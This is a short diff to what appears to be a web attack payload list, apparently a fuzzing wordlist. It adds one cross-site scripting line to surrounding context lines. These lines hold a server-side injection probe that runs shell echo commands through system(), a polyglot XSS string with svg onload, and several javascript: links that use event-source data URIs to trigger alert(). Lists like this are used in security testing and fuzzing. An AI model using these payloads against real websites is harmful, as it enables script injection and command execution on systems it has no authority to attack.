@@ -21575,6 +21575,7 @@ ${system(print(`echo%20yhcdbt%0aecho%20$((19%2b19))%0aecho%20yhcdbt%0aecho%20yhc
 <a href="javascript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */onclick=alert() )//%0d%0a%0d%0a//&lt;/style/&lt;/title/&lt;/textarea/&lt;/script/--!&gt;\x3csvg/&lt;svg/onload=alert()//&gt;\x3e">click me</a>
 <a href="javascript://%0d(0===0&&1==1)%0c?alert(1):confirm(2)">click</a>
 <a href="javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,event:click%0adata:xxx%0a%0a" /></a>
+<a href="javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,event:click%0adata:xxx%0a%0a">
 <a href="javascript:alert(74)"><event-source src="data:application/x-dom-event-stream,event:click%0adata:xxx%0a%0a" /></a>
 <a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,event:click%0adata:xxx%0a%0a">
 <a href="javascript:javascript:alert(8860)"><event-source src="data:application/x-dom-event-stream,event:click%0adata:xxx%0a%0a">
